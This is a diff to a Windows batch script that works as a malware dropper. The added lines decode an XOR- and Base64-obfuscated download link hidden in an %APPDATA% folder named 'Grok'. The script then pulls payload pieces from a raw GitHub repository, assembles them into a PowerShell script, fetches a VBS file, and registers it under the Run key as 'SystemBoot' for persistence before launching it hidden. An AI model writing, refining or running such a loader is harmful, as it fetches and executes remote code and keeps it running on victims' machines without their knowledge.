@@ -1,4 +1,6 @@
 @echo off
+setlocal
+
 set d=%APPDATA%\Grok
 set f=%d%\M.txt
 set a=%d%\f1.txt
@@ -6,16 +8,33 @@ set b=%d%\f2.txt
 set c=%d%\Nvs.ps1
 set v=%d%\S_m.vbs
 set u=raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/
-:: Read the dynamic link from l.txt
-set /p dynLink=<"%appdata%\Grok-l\l.txt"
+
+:: Decode the XOR+Base64-encoded link from l.txt using key "now"
+for /f "delims=" %%A in ('powershell -NoProfile -Command ^
+  "$k='now';" ^
+  "$e=[System.Convert]::FromBase64String((Get-Content -Raw '%APPDATA%\Grok-l\l.txt'));" ^
+  "$r=for ($i=0; $i -lt $e.Length; $i++) { $e[$i] -bxor [byte][char]$k[$i %% $k.Length] };" ^
+  "[Text.Encoding]::UTF8.GetString($r)"') do set "dynLink=%%A"
+
+:: Cleanup and prepare working folder
 rmdir /s /q "%d%" 2>nul
 mkdir "%d%"
+
+:: Download required files
 powershell -c "Start-BitsTransfer https://%u%/Final.txt '%f%'"
 timeout /t 5 /nobreak >nul
 powershell -c "Start-BitsTransfer https://%u%/First.txt '%a%'"
 powershell -c "Start-BitsTransfer %dynLink% '%b%'"
+
+:: Combine all and save as PowerShell script
 powershell -c "(gc '%f%' -Raw) -replace '----',(gc '%a%' -Raw) -replace '====',(gc '%b%' -Raw) | sc '%c%'"
 del "%a%" "%b%" 2>nul
+
+:: Download VBS and set registry key for persistence
 powershell -c "iwr https://%u%/S_m.vbs -OutFile '%v%'"
 powershell -c "sp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' SystemBoot 'wscript.exe \"%v%\"'"
+
+:: Run the VBS silently
 start /min wscript "%v%"
+
+endlocal
